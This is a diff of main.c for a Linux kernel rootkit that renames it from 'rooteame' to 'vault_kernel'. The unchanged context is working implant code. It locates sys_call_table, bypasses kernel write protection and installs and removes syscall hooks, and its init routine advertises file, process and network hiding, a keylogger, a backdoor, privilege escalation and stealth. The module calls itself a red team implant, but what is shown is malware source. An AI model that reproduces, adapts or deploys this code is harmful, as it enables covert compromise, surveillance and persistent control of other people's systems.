@@ -1,13 +1,13 @@
-/* rooteame - main.c
+/* vault_kernel - main.c
  * Kernel module entry/exit, sys_call_table discovery, WP bypass
  * ruby570bocadito © 2026
  */
 #include "core.h"
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR(ROOTEAME_AUTHOR);
-MODULE_VERSION(ROOTEAME_VERSION);
-MODULE_DESCRIPTION("rooteame kernel rootkit — professional red team implant");
+MODULE_AUTHOR(VAULT_KERNEL_AUTHOR);
+MODULE_VERSION(VAULT_KERNEL_VERSION);
+MODULE_DESCRIPTION("vault_kernel kernel rootkit — professional red team implant");
 
 unsigned long *sys_call_table = NULL;
 int module_hidden = 0;
@@ -120,9 +120,9 @@ unsigned long *find_sys_call_table(void) {
 
 found:
     if (table) {
-        pr_info(ROOTEAME_TAG " sys_call_table @ 0x%px\n", table);
+        pr_info(VAULT_KERNEL_TAG " sys_call_table @ 0x%px\n", table);
     } else {
-        pr_err(ROOTEAME_TAG " failed to locate sys_call_table\n");
+        pr_err(VAULT_KERNEL_TAG " failed to locate sys_call_table\n");
     }
     return table;
 }
@@ -154,7 +154,7 @@ int install_hook(struct hooked_syscall *h) {
     int wp;
 
     if (!h->table_entry) {
-        pr_err(ROOTEAME_TAG " null table_entry for %s\n", h->name);
+        pr_err(VAULT_KERNEL_TAG " null table_entry for %s\n", h->name);
         return -EINVAL;
     }
 
@@ -164,7 +164,7 @@ int install_hook(struct hooked_syscall *h) {
     *h->table_entry = h->hooked;
     restore_wp(wp);
 
-    pr_info(ROOTEAME_TAG " hooked %s (orig=0x%lx -> hook=0x%lx)\n",
+    pr_info(VAULT_KERNEL_TAG " hooked %s (orig=0x%lx -> hook=0x%lx)\n",
             h->name, h->original, h->hooked);
     return 0;
 }
@@ -179,7 +179,7 @@ void remove_hook(struct hooked_syscall *h) {
     *h->table_entry = h->original;
     restore_wp(wp);
 
-    pr_info(ROOTEAME_TAG " unhooked %s\n", h->name);
+    pr_info(VAULT_KERNEL_TAG " unhooked %s\n", h->name);
     h->table_entry = NULL;
     h->original = 0;
 }
@@ -187,16 +187,16 @@ void remove_hook(struct hooked_syscall *h) {
 /* ================================================================
  * Module init / exit
  * ================================================================ */
-static int __init rooteame_init(void) {
+static int __init vault_kernel_init(void) {
     int ret;
 
-    pr_info(ROOTEAME_TAG " loading v%s by %s\n",
-            ROOTEAME_VERSION, ROOTEAME_AUTHOR);
+    pr_info(VAULT_KERNEL_TAG " loading v%s by %s\n",
+            VAULT_KERNEL_VERSION, VAULT_KERNEL_AUTHOR);
 
     /* 1. Find sys_call_table */
     sys_call_table = find_sys_call_table();
     if (!sys_call_table) {
-        pr_err(ROOTEAME_TAG " cannot proceed without sys_call_table\n");
+        pr_err(VAULT_KERNEL_TAG " cannot proceed without sys_call_table\n");
         return -ENODEV;
     }
 
@@ -221,13 +221,13 @@ static int __init rooteame_init(void) {
     /* 3. Install syscall hooks */
     if ((ret = hooking_init()))     goto err;
 
-    pr_info(ROOTEAME_TAG " loaded — hooks=%d, features: "
+    pr_info(VAULT_KERNEL_TAG " loaded — hooks=%d, features: "
             "file_hide, proc_hide, net_hide, keylogger, backdoor, priv_esc, stealth\n",
             hooks_count);
     return 0;
 
 err:
-    pr_err(ROOTEAME_TAG " init failed (ret=%d), cleaning up\n", ret);
+    pr_err(VAULT_KERNEL_TAG " init failed (ret=%d), cleaning up\n", ret);
     hooking_cleanup();
     ioctl_cleanup();
     backdoor_cleanup();
@@ -239,7 +239,7 @@ err:
     return ret;
 }
 
-static void __exit rooteame_exit(void) {
+static void __exit vault_kernel_exit(void) {
     hooking_cleanup();
     ioctl_cleanup();
     backdoor_cleanup();
@@ -249,7 +249,7 @@ static void __exit rooteame_exit(void) {
     file_hide_cleanup();
     stealth_cleanup();
 
-    pr_info(ROOTEAME_TAG " unloaded\n");
+    pr_info(VAULT_KERNEL_TAG " unloaded\n");
 }
 
 /* ================================================================
@@ -262,5 +262,5 @@ asmlinkage long hooked_write(unsigned int fd, const char __user *buf,
     return orig_write(fd, buf, count);
 }
 
-module_init(rooteame_init);
-module_exit(rooteame_exit);
+module_init(vault_kernel_init);
+module_exit(vault_kernel_exit);
